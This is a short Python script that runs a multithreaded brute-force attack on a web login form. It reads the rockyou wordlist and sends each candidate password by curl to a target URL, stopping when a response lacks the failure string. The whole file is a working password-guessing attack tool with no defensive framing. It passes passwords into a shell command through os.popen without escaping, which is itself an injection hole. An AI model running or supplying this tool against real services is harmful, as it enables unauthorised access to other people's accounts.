import os
from threading import Thread
import time

url = "put full url here"
wordlist = "/usr/share/wordlists/rockyou.txt"
fail_str = "authentication failed"
response_min_len = 10
thread_number=20
curl_cmd = 'curl -s -F "password=^PASS^" ^URL^'

go=1
pswds = []

with open(wordlist, 'r') as f:
        pswds.append(f.readlines(1))


def try_pswd(pswd):
        global url,fail_str,response_min_len, curl_cmd
        resp = os.popen(curl_cmd.replace("^PASS^",pswd).replace("^URL^",url)).read()
        if len(resp) < response_min_len:
            print("caution! response with less than",response_min_len,"characters. double check url or reduce thread count")
        else:
             if not (fail_str in resp) and len(resp) > response_min_len:
                print("success!!",pswd,"is the correct password")
                return True
             else:
                return False

def work_thread():
        global pswds, go
        while go:
            try:
                next_pswd = pswds.pop(0)
                success = try_pswd(next_pswd)
                print(next_pswd,"\t:",success)
                if success:
                    go = 0
            except:
                pass

def main():
        global go,wordlist,thread_number,pswds,url,fail_str,wordlist,response_min_len,curl_cmd
        print("starting attack\nurl:\t\t\t",url,"\nwordlist:\t\t",wordlist,"\nfail str:\t\t",fail_str,"\nmin response len:\t",response_min_len,"\nthread count:\t\t",thread_number)
        threadlist=[]
        for thr in range(thread_number):
            threadlist.append(Thread(target=work_thread))
            threadlist[thr].start()
        with open(wordlist, 'r') as f:
            while go:
                try:
                    pswds.append(f.readlines(1)[0].replace("\n",""))
                    time.sleep(0.1)
                except IndexError:
                    go=0
        for thr in range(thread_number):
            threadlist[thr].join()

main()

